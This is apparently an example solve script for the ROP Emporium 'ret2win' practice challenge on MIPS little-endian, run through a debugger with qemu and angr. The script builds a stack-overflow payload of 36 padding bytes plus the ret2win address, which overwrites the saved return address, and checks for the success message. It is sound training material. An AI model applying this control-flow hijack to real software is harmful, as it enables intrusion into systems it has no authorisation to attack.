"""ROP Emporium ret2win on MIPS little-endian (o32, qemu-mipsel), in mydbg.

MIPS epilogue: `lw $ra, 0x3c($sp); ...; jr $ra` with the buffer at $fp+0x18,
so the saved $ra sits 36 bytes past the buffer's start. ret2win returns into
itself, so the success text repeats until the stdio buffer flushes — the
drain waits for it.

    ./build/dev/mydbg --headless-script examples/rop_emporium/solve_ret2win_mipsel.py
"""

from __future__ import annotations

import struct

from mydbg import symbolic

import emporium

PAD = 36  # buffer at $sp+0x18, saved $ra at $sp+0x3c


def run(dbg):
    if not symbolic.requires_angr():
        raise RuntimeError(symbolic.BOOTSTRAP_HINT)
    emporium.require_sysroots(("mipsel",))
    binary = emporium.challenge_path("mipsel", "ret2win_mipsel")
    project = symbolic._entry_project(dbg, binary=binary)  # noqa: SLF001
    target = symbolic.resolve_project_symbol(project, "ret2win")
    payload = b"A" * PAD + struct.pack("<I", target)
    print(f"[+] ret2win at {target:#x}, pad {PAD}")

    process = emporium.qemu_connect(dbg, "mipsel", binary, payload=payload)

    # qemu-mipsel + LLDB double-stops at the guest entry (a SIGTRAP at
    # __start on the first resumes); drive past it until the pwnme
    # breakpoint reports.
    entry = emporium.symbol(dbg, "__start")
    dbg.set_breakpoint("pwnme")
    for _ in range(6):
        result = dbg.continue_and_wait(timeout=30)
        if result.state == "exited":
            raise RuntimeError("the target exited before pwnme")
        if dbg.snapshot().pc != entry:
            break
    else:
        raise RuntimeError("could not get past the qemu entry trap")
    print(f"[+] stopped at pwnme ({dbg.snapshot().pc:#x})")

    after_read = emporium.after_read_address(dbg)
    dbg.set_breakpoint(f"{after_read:#x}")
    result = dbg.continue_and_wait(timeout=30)
    if result.state != "stopped":
        raise RuntimeError("the after-read stop was missed")
    print(f"[+] stopped after the read at {after_read:#x}")

    result = dbg.continue_and_wait(timeout=30)
    output = emporium.drain(process, seconds=8.0)
    if b"Well done" not in output:
        raise RuntimeError(f"ret2win chain failed: {output[-160:]!r}")
    print("[+] ret2win-mipsel-solve-ok:", output[-120:].decode(errors="replace").strip())
